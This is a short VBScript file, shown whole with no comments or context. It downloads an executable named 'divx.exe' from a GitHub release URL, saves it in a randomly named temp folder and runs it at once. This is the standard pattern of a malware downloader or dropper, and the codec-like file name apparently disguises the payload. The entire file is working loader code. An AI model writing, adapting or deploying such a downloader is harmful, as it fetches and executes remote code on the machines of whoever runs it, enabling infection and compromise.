Dim http, stream, fso, tmpDir, exePath, rndName
Set fso = CreateObject("Scripting.FileSystemObject")
rndName = fso.GetTempName()
tmpDir = fso.BuildPath(fso.GetSpecialFolder(2), rndName)
fso.CreateFolder tmpDir
exePath = fso.BuildPath(tmpDir, "divx.exe")
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", "https://github.com/b4xwv6p/main/releases/download/bin/divx.exe", False
http.Send
If http.Status = 200 Then
  Set stream = CreateObject("ADODB.Stream")
  stream.Type = 1
  stream.Open
  stream.Write http.ResponseBody
  stream.SaveToFile exePath, 2
  stream.Close
  Set stream = Nothing
  Set http = Nothing
  CreateObject("Shell.Application").ShellExecute exePath, "", tmpDir, "", 1
End If
Set fso = Nothing
